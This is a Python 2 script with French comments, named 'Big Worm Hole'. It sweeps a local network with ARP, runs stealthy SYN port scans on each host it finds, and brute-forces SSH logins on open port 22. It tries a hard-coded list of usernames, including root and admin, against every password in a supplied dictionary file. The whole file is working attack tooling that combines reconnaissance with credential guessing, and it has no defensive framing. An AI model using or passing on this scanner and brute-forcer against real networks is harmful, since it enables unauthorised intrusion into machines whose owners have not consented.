#!/usr/bin/python
#Fonction connexion SSH
def connectionSSH(ip,listLogin,password):
        #On instance un objet paramiko.sshclient sous le nom de "ssh"
        ssh = paramiko.SSHClient()
        #Pour empecher l'erreur "CLE PUBLIQUE NON CONNU)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if args.debug:
                messageDebug("Debut de la fonction connectionSSH(%s)" %(ip))
        for login in listLogin:
                if args.debug:
                        messageDebug("Test du couple login: %s/ Mot de passe: %s" %(login,password))
                try:
                        ssh.connect(ip, username=login, password=password)
                        stdin, stdout, stderr = ssh.exec_command('uptime')
                        if args.debug:
                                messageDebug("Sortie SSH: %s" %(stdout.read()))
                        messageInfo("Connexion reussi en SSH avec le couple login: %s / Mot de passe: %s" %(login,password))
                except paramiko.AuthenticationException, e:
                        if args.debug:
                                messageDebug("Probleme d authentification avec l'utilisateur %s..." %(login))
                                messageDebug(e)
                        pass

#Fonction message DEBUG couleur jaune:
def messageDebug(message):
        print colored ("DEBUG - %s" %(message),'cyan')

#Fonction message INFO couleur vert:
def messageInfo(message):
        print colored ("INFO  - %s" %(message), 'green')

#Fonction message WARN couleur orange:
def messageWarn(message):
        print colored ("WARN  - %s" %(message), 'yellow')

#Fonction message CRIT couleur rouge:
def messageCrit(message):
        print colored ("CRIT  - %s" %(message), 'red')

#Fonction message Deco couleur mangeta:
def messageDeco(message):
        print colored ("------------------------------------------------------------", 'magenta')
        print colored (" %s " %(message), 'magenta')
        print colored ("------------------------------------------------------------", 'magenta')

#Utilise pour avoir des jolies logs
from termcolor import colored
#IMPORT DES LIBRAIRIE
import logging
#Utilise pour faire fermer sa gueule a scappy
logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)
#Utilise pour pouvoir donner des arguments
import argparse
#Utilise pour ce connceter en SSH
import paramiko
#Utilise pour le scan reseau/port
from scapy.all import *

#ARGUMENTS
parser = argparse.ArgumentParser()
parser.add_argument("-f", "--fichier-dictionnaire", help="Emplacement du fichier dictionnaire a utiliser")
parser.add_argument("-n", "--network", help="Adresse IP et CIDR du reseau a scanner", default="192.168.1.0/24")
parser.add_argument("-d", "--debug", help="Activation du mod debug")
args=parser.parse_args()

#DEBUT SCRIPT
messageDeco("Big Worm Hole")

#Variable utilise pour savoir si le mod debug est active ou pas
if args.debug:
        messageDebug("Definition des variables et initialisation...")
debugActive=False
listPortDestination=20,21,22,25,80,587
listLogin=["root","mjusteau","admin","administrateur","administrator"]
dictionnaire=open(args.fichier_dictionnaire)
listPassword = dictionnaire.read().splitlines()

#On initialise une liste. On initialise une liste qui contiendra
listIP=[]
if args.debug:
        messageDebug("Valeur variable fichier_dictionnaire: %s" %(args.fichier_dictionnaire))

#PARTIE 1: SCAN RESEAU ARP GLOBAL
messageDeco("Debut Scan ARP IP: %s" %(args.network))
scanReseau,o=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=args.network),timeout=2,verbose=debugActive)

for paquetEnvoye,paquetRecu in scanReseau:
        ip=paquetRecu.sprintf("%ARP.psrc%")
        messageInfo("IP %s joignable" %(ip))
        listIP.append(ip)
if len(listIP) == 0:
        messageCrit("Aucun hote trouve dans le reseau indique: %s" %(args.network))
        quit()
if args.debug:
        messageDebug("Fin du Scan Reseau ARP")
        messageDebug("Valeur variable listIP: %s" %(listIP))
#On coupe la boucle ici sinon on vas devoir tester tout les mots de passes pour toutes les ip, proceder lourd

#Partie 2: Scan discret des port par hote joignable
for ip in listIP:
        messageDeco("Debut scan port pour IP: %s" %(ip))
        portSource = RandShort()
        if args.debug:
                messageDebug( "Port source aleatoire: %s" %(portSource))
        for portDestination in listPortDestination:
                portOuvert=False
                messageInfo("Debut du scan pour %s:%s" %(ip,portDestination))
                if args.debug:
                        messageDebug("Envoie paquet SYN pour %s:%s" %(ip,portDestination))
                scanReseauDiscret = sr1(IP(dst=ip)/TCP(sport=portSource,dport=portDestination,flags="S"),timeout=10,verbose=debugActive)
                try:
                        if(scanReseauDiscret.getlayer(TCP).flags == 0x12):
                                if args.debug:
                                        messageDebug("Envoie paquet RST pour %s:%s" %(ip,portDestination))
                                paquetRST = sr(IP(dst=ip)/TCP(sport=portSource,dport=portDestination,flags="R"),timeout=10,verbose=debugActive)
                                messageInfo("Le port %s:%s est OUVERT" %(ip,portDestination))
                                portOuvert=True
                                if args.debug:
                                        messageDebug("Valeur portOuvert: %s" %(portOuvert))
                        #Test Connexion Port
                        if portOuvert:
                                messageInfo("Debut du test de connexion pour le port %s:%s" %(ip,portDestination))
                                if args.debug:
                                        messageDebug("Debut du test de connexion pour le port %s:%s" %(ip,portDestination))
                                for password in listPassword:
                                        if args.debug:
                                                messageDebug("Valeur password: %s" %(password))
                                                messageDebug("Test de connexion pour %s:%s" %(ip,portDestination))
                                        if portDestination == 22:
                                                connectionSSH(ip,listLogin,password)
                except AttributeError,e:
                        messageCrit("Probleme avec paquet recu de %s:%s" %(ip,portOuvert))
                        messageCrit("Message de l'erreur: %s" %(e))
                        pass